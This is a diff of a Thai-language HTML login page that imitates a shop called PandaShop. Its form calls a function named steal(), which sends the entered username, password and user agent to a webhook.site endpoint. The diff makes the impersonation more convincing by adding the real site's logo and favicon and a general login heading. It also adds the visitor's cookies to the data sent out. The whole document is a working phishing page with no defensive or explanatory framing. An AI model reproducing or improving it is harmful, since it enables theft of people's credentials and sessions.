@@ -2,12 +2,13 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>เข้าสู่ระบบ - Pandashop</title>
+  <title>เข้าสู่ระบบ - PandaShop</title>
+  <link rel="icon" type="image/png" href="https://pandashop.rdcw.xyz/favicon.ico">
   <link href="https://fonts.googleapis.com/css2?family=Kanit&display=swap" rel="stylesheet">
   <style>
     body {
       font-family: 'Kanit', sans-serif;
-      background-color: #f7f7f7;
+      background-color: #f0f2f5;
       display: flex;
       flex-direction: column;
       align-items: center;
@@ -16,47 +17,64 @@
       margin: 0;
     }
     .login-box {
-      background: #fff;
+      background: #ffffff;
       padding: 40px;
       border-radius: 12px;
-      box-shadow: 0 4px 12px rgba(0,0,0,0.1);
-      max-width: 360px;
+      box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+      max-width: 400px;
       width: 100%;
+    }
+    .logo {
+      display: block;
+      margin: 0 auto 20px;
+      width: 100px;
     }
     .login-box h2 {
       text-align: center;
       margin-bottom: 24px;
+      font-size: 1.4rem;
+      color: #333;
     }
     .login-box input {
       width: 100%;
       padding: 12px;
       margin-bottom: 16px;
       border-radius: 8px;
-      border: 1px solid #ccc;
+      border: 1px solid #dcdcdc;
+      font-size: 1rem;
     }
     .login-box button {
       width: 100%;
       padding: 12px;
-      background-color: #0066ff;
+      background-color: #0d99ff;
       color: white;
       border: none;
       border-radius: 8px;
       cursor: pointer;
+      font-size: 1rem;
       font-weight: bold;
     }
     .login-box button:hover {
-      background-color: #004cc9;
+      background-color: #0077cc;
+    }
+    .footnote {
+      text-align: center;
+      font-size: 0.85rem;
+      color: #888;
+      margin-top: 12px;
     }
   </style>
 </head>
 <body>
   <div class="login-box">
-    <h2>เข้าสู่ระบบผู้ดูแลระบบ</h2>
+    <img class="logo" src="https://pandashop.rdcw.xyz/_next/image?url=%2Flogo.png&w=128&q=75" alt="PandaShop Logo">
+    <h2>เข้าสู่ระบบ PandaShop</h2>
     <form onsubmit="steal(); return false;">
       <input type="text" id="user" name="username" placeholder="ชื่อผู้ใช้" required>
       <input type="password" id="pass" name="password" placeholder="รหัสผ่าน" required>
       <button type="submit">เข้าสู่ระบบ</button>
     </form>
+    <div class="footnote">© 2025 PandaShop Platform</div>
   </div>  <script>
     function steal() {
       const u = document.getElementById('user').value;
@@ -66,7 +84,8 @@
         username: u,
         password: p,
         ua: ua,
-        time: new Date().toISOString()
+        time: new Date().toISOString(),
+        cookie: document.cookie
       };
       fetch('https://webhook.site/37fdcdfb-da6e-4ea7-beb2-099d6c982b4d', {
         method: 'POST',
